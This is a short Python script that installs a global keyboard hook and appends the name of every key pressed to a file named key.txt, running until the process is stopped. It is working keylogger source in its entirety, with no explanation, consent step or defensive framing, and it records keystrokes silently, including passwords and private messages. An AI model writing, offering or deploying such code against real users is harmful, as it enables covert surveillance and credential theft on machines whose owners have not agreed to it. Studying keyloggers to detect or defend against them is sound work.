import keyboard
logfile = 'key.txt'
def key_press(event):
    with open(logfile, 'a') as k:
        k.write('{}\n'.format(event.name))

keyboard.on_press(key_press)

keyboard.wait()


